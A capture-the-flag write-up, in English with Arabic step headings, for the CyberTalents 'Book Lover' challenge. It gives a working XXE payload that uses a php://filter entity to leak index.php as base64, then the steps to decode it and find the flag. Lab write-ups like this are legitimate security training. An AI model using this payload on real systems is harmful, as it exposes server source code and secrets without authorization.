# 🛡️ CyberTalents Challenge Name:Book Lover

## 🔍 Challenge Summary
## Challenge Name : Book Lover
We are given a target web app that processes user input via POST requests. While experimenting, we discovered the backend executes part of the input dynamically using PHP.

Upon deeper testing, we confirmed the server is vulnerable to **XXE injection** with access to `php://filter`, which allows reading the PHP source code of server-side files, base64-encoded.

---

## 🚀 Exploitation Steps | خطوات الاستغلال

### 1️⃣ Upload the XML Payload | رفع ملف XML يحتوي على الحمولة

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <data>&xxe;</data>
</root>
```


2️⃣ Copy the Base64 Output | نسخ الإخراج المشفر
Once the payload is submitted, you will see a long base64-encoded string in the output.

3️⃣ Decode the Base64 | فك تشفير البايس 64
Use any base64 decoder:

🔹 Online: https://www.base64decode.org
🔹 Or via terminal:
```
echo "PASTE_BASE64_HERE" | base64 -d
```
4️⃣ Analyze the Decoded PHP Code | تحليل الكود بعد فك التشفير
After decoding the output, you’ll see the actual source code of index.php.

Search inside it for keywords like:
$flag = '********';
🎉 The flag is found! Mission accomplished.
